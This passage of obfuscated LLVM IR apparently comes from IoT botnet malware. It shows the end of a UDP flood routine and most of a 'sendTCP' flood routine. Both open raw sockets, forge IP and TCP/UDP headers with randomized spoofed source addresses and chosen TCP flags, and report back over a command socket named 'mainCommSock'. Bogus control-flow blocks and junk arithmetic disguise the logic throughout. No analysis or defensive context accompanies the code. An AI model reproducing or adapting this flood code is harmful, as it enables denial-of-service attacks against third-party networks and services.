  %331 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %330, i32 0, i32 0
  %332 = bitcast %union.anon.2* %331 to %struct.anon.3*
  %333 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %332, i32 0, i32 0
  store i16 %329, i16* %333, align 2
  %334 = load i32, i32* %8, align 4
  %335 = icmp eq i32 %334, 0
  br i1 %335, label %336, label %338

; <label>:336:                                    ; preds = %324
  %337 = call i32 @rand_cmwc()
  br label %343

; <label>:338:                                    ; preds = %324
  %339 = load i32, i32* %8, align 4
  %340 = trunc i32 %339 to i16
  %341 = call zeroext i16 @htons(i16 zeroext %340) #13
  %342 = zext i16 %341 to i32
  br label %343

; <label>:343:                                    ; preds = %338, %336
  %344 = phi i32 [ %337, %336 ], [ %342, %338 ]
  %345 = trunc i32 %344 to i16
  %346 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %347 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %346, i32 0, i32 0
  %348 = bitcast %union.anon.2* %347 to %struct.anon.3*
  %349 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %348, i32 0, i32 1
  store i16 %345, i16* %349, align 2
  %350 = call i32 @rand_cmwc()
  %351 = trunc i32 %350 to i16
  %352 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 3
  store i16 %351, i16* %353, align 4
  %354 = load i32, i32* %22, align 4
  %355 = call i32 @getRandomIP(i32 %354)
  %356 = call i32 @htonl(i32 %355) #13
  %357 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %358 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %357, i32 0, i32 8
  store i32 %356, i32* %358, align 4
  %359 = bitcast i8* %248 to i16*
  %360 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %361 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %360, i32 0, i32 2
  %362 = load i16, i16* %361, align 2
  %363 = zext i16 %362 to i32
  %364 = call zeroext i16 @csum(i16* %359, i32 %363)
  %365 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i32 0, i32 7
  store i16 %364, i16* %366, align 2
  %367 = load i32, i32* %27, align 4
  %368 = load i32, i32* %14, align 4
  %369 = icmp eq i32 %367, %368
  br i1 %369, label %370, label %392

; <label>:370:                                    ; preds = %343
  %371 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %372 = load i32, i32* %26, align 4
  %373 = icmp sgt i32 %371, %372
  br i1 %373, label %374, label %391

; <label>:374:                                    ; preds = %370
  %375 = load i32, i32* @x.99
  %376 = load i32, i32* @y.100
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %374
  %383 = load i32, i32* @x.99
  %384 = load i32, i32* @y.100
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %395

; <label>:391:                                    ; preds = %370
  store i32 0, i32* %27, align 4
  br label %323

; <label>:392:                                    ; preds = %343
  %393 = load i32, i32* %27, align 4
  %394 = add i32 %393, 1
  store i32 %394, i32* %27, align 4
  br label %323

; <label>:395:                                    ; preds = %originalBBpart262
  %396 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %396)
  br label %397

; <label>:397:                                    ; preds = %395, %196, %188, %167, %98, %originalBBpart24, %61
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %40
  %398 = load i8*, i8** %7, align 8
  %399 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %400 = call i32 @getHost(i8* %398, %struct.in_addr* %399)
  %401 = icmp ne i32 %400, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %72
  %402 = load i32, i32* @mainCommSock, align 4
  %403 = call i32 (i32, i8*, ...) @sockprintf(i32 %402, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %119
  %404 = load i32, i32* %8, align 4
  %405 = icmp eq i32 %404, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %146
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %168
  %406 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %406, i32* %19, align 4
  %407 = load i32, i32* %19, align 4
  %408 = icmp ne i32 %407, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %213
  %409 = load i32, i32* %10, align 4
  %_ = shl i32 32, %409
  %410 = sub nsw i32 32, %409
  %_19 = sub i32 0, 1
  %gen = add i32 %_19, %410
  %_20 = sub i32 0, 1
  %gen21 = add i32 %_20, %410
  %411 = shl i32 1, %410
  %_22 = sub i32 %411, 1
  %gen23 = mul i32 %_22, 1
  %_24 = sub i32 %411, 1
  %gen25 = mul i32 %_24, 1
  %412 = sub nsw i32 %411, 1
  %_26 = shl i32 %412, -1
  %_27 = sub i32 0, %412
  %gen28 = add i32 %_27, -1
  %_29 = sub i32 0, %412
  %gen30 = add i32 %_29, -1
  %_31 = sub i32 %412, -1
  %gen32 = mul i32 %_31, -1
  %_33 = shl i32 %412, -1
  %413 = xor i32 %412, -1
  store i32 %413, i32* %22, align 4
  br label %originalBB18

originalBB37alteredBB:                            ; preds = %originalBB37, %235
  %414 = load i32, i32* %11, align 4
  %415 = sext i32 %414 to i64
  %416 = add i64 28, %415
  %417 = call i8* @llvm.stacksave()
  store i8* %417, i8** %23, align 8
  %418 = alloca i8, i64 %416, align 16
  %419 = bitcast i8* %418 to %struct.iphdr*
  store %struct.iphdr* %419, %struct.iphdr** %24, align 8
  %420 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %421 = bitcast %struct.iphdr* %420 to i8*
  %422 = getelementptr i8, i8* %421, i64 20
  %423 = bitcast i8* %422 to %struct.udphdr*
  store %struct.udphdr* %423, %struct.udphdr** %25, align 8
  %424 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %425 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %426 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %425, i32 0, i32 0
  %427 = load i32, i32* %426, align 4
  %428 = load i32, i32* %22, align 4
  %429 = call i32 @getRandomIP(i32 %428)
  %430 = call i32 @htonl(i32 %429) #13
  %431 = load i32, i32* %11, align 4
  %432 = sext i32 %431 to i64
  %_38 = sub i64 8, %432
  %gen39 = mul i64 %_38, %432
  %_40 = sub i64 8, %432
  %gen41 = mul i64 %_40, %432
  %_42 = sub i64 0, 8
  %gen43 = add i64 %_42, %432
  %_44 = sub i64 8, %432
  %gen45 = mul i64 %_44, %432
  %_46 = sub i64 8, %432
  %gen47 = mul i64 %_46, %432
  %_48 = shl i64 8, %432
  %_49 = sub i64 0, 8
  %gen50 = add i64 %_49, %432
  %433 = add i64 8, %432
  %434 = trunc i64 %433 to i32
  call void @makeIPPacket(%struct.iphdr* %424, i32 %427, i32 %430, i8 zeroext 17, i32 %434)
  %435 = load i32, i32* %11, align 4
  %436 = sext i32 %435 to i64
  %_51 = sub i64 8, %436
  %gen52 = mul i64 %_51, %436
  %_53 = sub i64 8, %436
  %gen54 = mul i64 %_53, %436
  %_55 = sub i64 8, %436
  %gen56 = mul i64 %_55, %436
  %437 = add i64 8, %436
  %438 = trunc i64 %437 to i16
  %439 = call zeroext i16 @htons(i16 zeroext %438) #13
  %440 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %441 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %440, i32 0, i32 0
  %442 = bitcast %union.anon.2* %441 to %struct.anon.3*
  %443 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %442, i32 0, i32 2
  store i16 %439, i16* %443, align 2
  %444 = call i32 @rand_cmwc()
  %445 = trunc i32 %444 to i16
  %446 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %447 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %446, i32 0, i32 0
  %448 = bitcast %union.anon.2* %447 to %struct.anon.3*
  %449 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %448, i32 0, i32 0
  store i16 %445, i16* %449, align 2
  %450 = load i32, i32* %8, align 4
  %451 = icmp eq i32 %450, 0
  br label %originalBB37

originalBB60alteredBB:                            ; preds = %originalBB60, %374
  br label %originalBB60
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i32, i32* @x.101
  %41 = load i32, i32* @y.102
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = load i8*, i8** %8, align 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %50 = call i32 @getHost(i8* %48, %struct.in_addr* %49)
  %51 = icmp ne i32 %50, 0
  %52 = load i32, i32* @x.101
  %53 = load i32, i32* @y.102
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %51, label %60, label %61

; <label>:60:                                     ; preds = %originalBBpart2
  br label %547

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %63 = getelementptr inbounds [8 x i8], [8 x i8]* %62, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 8, i32 4, i1 false)
  %64 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %64, i32* %17, align 4
  %65 = load i32, i32* %17, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %86, label %67

; <label>:67:                                     ; preds = %61
  %68 = load i32, i32* @x.101
  %69 = load i32, i32* @y.102
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = load i32, i32* @mainCommSock, align 4
  %77 = call i32 (i32, i8*, ...) @sockprintf(i32 %76, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  %78 = load i32, i32* @x.101
  %79 = load i32, i32* @y.102
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %547

; <label>:86:                                     ; preds = %61
  store i32 1, i32* %18, align 4
  %87 = load i32, i32* %17, align 4
  %88 = bitcast i32* %18 to i8*
  %89 = call i32 @setsockopt(i32 %87, i32 0, i32 3, i8* %88, i32 4) #5
  %90 = icmp slt i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %86
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = call i32 (i32, i8*, ...) @sockprintf(i32 %92, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.415, i32 0, i32 0))
  br label %547

; <label>:94:                                     ; preds = %86
  %95 = load i32, i32* @x.101
  %96 = load i32, i32* @y.102
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i32, i32* %11, align 4
  %104 = icmp eq i32 %103, 0
  %105 = load i32, i32* @x.101
  %106 = load i32, i32* @y.102
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %104, label %113, label %114

; <label>:113:                                    ; preds = %originalBBpart28
  store i32 0, i32* %19, align 4
  br label %120

; <label>:114:                                    ; preds = %originalBBpart28
  %115 = load i32, i32* %11, align 4
  %116 = sub nsw i32 32, %115
  %117 = shl i32 1, %116
  %118 = sub nsw i32 %117, 1
  %119 = xor i32 %118, -1
  store i32 %119, i32* %19, align 4
  br label %120

; <label>:120:                                    ; preds = %114, %113
  %121 = load i32, i32* %13, align 4
  %122 = sext i32 %121 to i64
  %123 = add i64 40, %122
  %124 = call i8* @llvm.stacksave()
  store i8* %124, i8** %20, align 8
  %125 = alloca i8, i64 %123, align 16
  %126 = bitcast i8* %125 to %struct.iphdr*
  store %struct.iphdr* %126, %struct.iphdr** %21, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = getelementptr i8, i8* %128, i64 20
  %130 = bitcast i8* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %22, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %132 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %133 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %132, i32 0, i32 0
  %134 = load i32, i32* %133, align 4
  %135 = load i32, i32* %19, align 4
  %136 = call i32 @getRandomIP(i32 %135)
  %137 = call i32 @htonl(i32 %136) #13
  %138 = load i32, i32* %13, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 20, %139
  %141 = trunc i64 %140 to i32
  call void @makeIPPacket(%struct.iphdr* %131, i32 %134, i32 %137, i8 zeroext 6, i32 %141)
  %142 = call i32 @rand_cmwc()
  %143 = trunc i32 %142 to i16
  %144 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon.0* %145 to %struct.anon.1*
  %147 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %146, i32 0, i32 0
  store i16 %143, i16* %147, align 4
  %148 = call i32 @rand_cmwc()
  %149 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon.0* %150 to %struct.anon.1*
  %152 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %151, i32 0, i32 2
  store i32 %148, i32* %152, align 4
  %153 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %154 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %153, i32 0, i32 0
  %155 = bitcast %union.anon.0* %154 to %struct.anon.1*
  %156 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %155, i32 0, i32 3
  store i32 0, i32* %156, align 4
  %157 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon.0* %158 to %struct.anon.1*
  %160 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %159, i32 0, i32 4
  %161 = load i16, i16* %160, align 4
  %162 = and i16 %161, -241
  %163 = or i16 %162, 80
  store i16 %163, i16* %160, align 4
  %164 = load i8*, i8** %12, align 8
  %165 = call i32 @strcmp(i8* %164, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.416, i32 0, i32 0)) #10
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %219, label %167

; <label>:167:                                    ; preds = %120
  %168 = load i32, i32* @x.101
  %169 = load i32, i32* @y.102
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %167
  %176 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  %178 = bitcast %union.anon.0* %177 to %struct.anon.1*
  %179 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %178, i32 0, i32 4
  %180 = load i16, i16* %179, align 4
  %181 = and i16 %180, -513
  %182 = or i16 %181, 512
  store i16 %182, i16* %179, align 4
  %183 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon.0* %184 to %struct.anon.1*
  %186 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %185, i32 0, i32 4
  %187 = load i16, i16* %186, align 4
  %188 = and i16 %187, -1025
  %189 = or i16 %188, 1024
  store i16 %189, i16* %186, align 4
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.0* %191 to %struct.anon.1*
  %193 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -257
  %196 = or i16 %195, 256
  store i16 %196, i16* %193, align 4
  %197 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %198 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %197, i32 0, i32 0
  %199 = bitcast %union.anon.0* %198 to %struct.anon.1*
  %200 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %201, -4097
  %203 = or i16 %202, 4096
  store i16 %203, i16* %200, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.0* %205 to %struct.anon.1*
  %207 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -2049
  %210 = or i16 %209, 2048
  store i16 %210, i16* %207, align 4
  %211 = load i32, i32* @x.101
  %212 = load i32, i32* @y.102
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart291, label %originalBB10alteredBB

originalBBpart291:                                ; preds = %originalBB10
  br label %408

; <label>:219:                                    ; preds = %120
  %220 = load i8*, i8** %12, align 8
  %221 = call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %221, i8** %23, align 8
  br label %222

; <label>:222:                                    ; preds = %405, %219
  %223 = load i8*, i8** %23, align 8
  %224 = icmp ne i8* %223, null
  br i1 %224, label %225, label %407

; <label>:225:                                    ; preds = %222
  %226 = load i8*, i8** %23, align 8
  %227 = call i32 @strcmp(i8* %226, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.418, i32 0, i32 0)) #10
  %228 = icmp ne i32 %227, 0
  br i1 %228, label %253, label %229

; <label>:229:                                    ; preds = %225
  %230 = load i32, i32* @x.101
  %231 = load i32, i32* @y.102
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %229
  %238 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 0
  %240 = bitcast %union.anon.0* %239 to %struct.anon.1*
  %241 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %242, -513
  %244 = or i16 %243, 512
  store i16 %244, i16* %241, align 4
  %245 = load i32, i32* @x.101
  %246 = load i32, i32* @y.102
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart2100, label %originalBB93alteredBB

originalBBpart2100:                               ; preds = %originalBB93
  br label %405

; <label>:253:                                    ; preds = %225
  %254 = load i8*, i8** %23, align 8
  %255 = call i32 @strcmp(i8* %254, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.419, i32 0, i32 0)) #10
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %265, label %257

; <label>:257:                                    ; preds = %253
  %258 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon.0* %259 to %struct.anon.1*
  %261 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %262, -1025
  %264 = or i16 %263, 1024
  store i16 %264, i16* %261, align 4
  br label %404

; <label>:265:                                    ; preds = %253
  %266 = load i8*, i8** %23, align 8
  %267 = call i32 @strcmp(i8* %266, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.420, i32 0, i32 0)) #10
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %293, label %269

; <label>:269:                                    ; preds = %265
  %270 = load i32, i32* @x.101
  %271 = load i32, i32* @y.102
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %269
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 4
  %282 = load i16, i16* %281, align 4
  %283 = and i16 %282, -257
  %284 = or i16 %283, 256
  store i16 %284, i16* %281, align 4
  %285 = load i32, i32* @x.101
  %286 = load i32, i32* @y.102
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBBpart2111, label %originalBB102alteredBB

originalBBpart2111:                               ; preds = %originalBB102
  br label %403

; <label>:293:                                    ; preds = %265
  %294 = load i32, i32* @x.101
  %295 = load i32, i32* @y.102
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %293
  %302 = load i8*, i8** %23, align 8
  %303 = call i32 @strcmp(i8* %302, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.421, i32 0, i32 0)) #10
  %304 = icmp ne i32 %303, 0
  %305 = load i32, i32* @x.101
  %306 = load i32, i32* @y.102
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br i1 %304, label %337, label %313

; <label>:313:                                    ; preds = %originalBBpart2115
  %314 = load i32, i32* @x.101
  %315 = load i32, i32* @y.102
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %313
  %322 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %323 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %322, i32 0, i32 0
  %324 = bitcast %union.anon.0* %323 to %struct.anon.1*
  %325 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %324, i32 0, i32 4
  %326 = load i16, i16* %325, align 4
  %327 = and i16 %326, -4097
  %328 = or i16 %327, 4096
  store i16 %328, i16* %325, align 4
  %329 = load i32, i32* @x.101
  %330 = load i32, i32* @y.102
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart2135, label %originalBB117alteredBB

originalBBpart2135:                               ; preds = %originalBB117
  br label %402

; <label>:337:                                    ; preds = %originalBBpart2115
  %338 = load i32, i32* @x.101
  %339 = load i32, i32* @y.102
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %337
  %346 = load i8*, i8** %23, align 8
  %347 = call i32 @strcmp(i8* %346, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.422, i32 0, i32 0)) #10
  %348 = icmp ne i32 %347, 0
  %349 = load i32, i32* @x.101
  %350 = load i32, i32* @y.102
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br i1 %348, label %381, label %357

; <label>:357:                                    ; preds = %originalBBpart2139
  %358 = load i32, i32* @x.101
  %359 = load i32, i32* @y.102
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %357
